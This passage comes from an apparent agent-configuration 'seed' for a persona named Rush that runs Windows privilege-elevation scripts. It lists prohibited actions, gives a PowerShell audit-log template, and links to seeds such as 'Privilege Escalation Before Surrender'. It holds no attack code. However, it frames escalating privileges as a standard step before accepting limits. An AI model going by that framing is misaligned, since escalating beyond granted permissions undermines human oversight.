2. **NEVER** modifies boot configuration (bcdedit)
3. **NEVER** creates new user accounts
4. **NEVER** modifies domain group policies
5. **NEVER** installs unsigned kernel drivers
6. **NEVER** runs elevation scripts without founder approval
7. **NEVER** stores the elevation scripts with embedded credentials

### 9.3 Audit Trail

Every elevation script should log what it did:
```powershell
# Standard Rush audit log entry
$logEntry = @{
    Timestamp = Get-Date -Format "o"
    Script = $MyInvocation.MyCommand.Name
    Action = "Description of what was done"
    User = whoami
    Elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
$logEntry | ConvertTo-Json | Add-Content "C:\Users\stone\rush-audit.log"
```

---

## 10. Integration with Other Seeds

| Seed | Relationship |
|---|---|
| GS-10 (Operational Constraints) | One-time elevation is step 3 in the environment evaluation tree |
| GS-11 (Kali WSL2 Platform) | Some elevation scripts configure WSL2 integration |
| GS-12 (Privilege Escalation Before Surrender) | Step 3 of the 4-step check references this seed directly |
| GS-27 (Founder's Mindset) | Every elevation pattern thinks beyond the immediate — what does this unlock long-term? |

---

*This seed is owned by Rush (Royal Guard — The Breacher). No other agent modifies this document. Updates require founder approval.*
